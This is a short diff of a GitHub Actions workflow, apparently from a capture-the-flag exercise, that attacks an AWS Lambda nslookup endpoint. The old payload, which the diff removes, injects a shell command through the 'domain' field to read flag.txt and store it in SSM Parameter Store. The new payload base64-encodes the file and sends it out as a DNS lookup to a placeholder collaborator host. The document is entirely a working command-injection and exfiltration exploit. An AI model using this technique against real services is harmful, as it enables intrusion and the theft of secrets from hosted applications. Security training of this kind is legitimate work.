@@ -25,16 +25,11 @@ jobs:
           REGION="us-east-1"
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           
-          echo "=== 1. WRITING FLAG TO SSM PARAMETER STORE ==="
-          PAYLOAD='{"domain": "127.0.0.1; FLAG=$(cat /var/task/flag.txt || find / -name flag.txt 2>/dev/null); aws ssm put-parameter --name \"/ctf/flag\" --type \"String\" --value \"$FLAG\" --overwrite --region us-east-1"}'
+          # Replace YOUR_SUBDOMAIN with your DNS collaborator host (e.g., xxx.oastify.com or xxx.interact.sh)
+          COLLABORATOR="YOUR_SUBDOMAIN.com"
+          
+          PAYLOAD="{\"domain\": \"127.0.0.1; FLAG=\$(cat /var/task/flag.txt | base64 | tr -d '\n'); dig \$FLAG.$COLLABORATOR\"}"
           
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
-          
-          sleep 3
-          
-          echo "=== 2. READING PARAMETER VIA CICDROLE ==="
-          aws ssm get-parameter --name "/ctf/flag" --region us-east-1 --query "Parameter.Value" --output text > ./the_flag.txt
-          
-          cat ./the_flag.txt
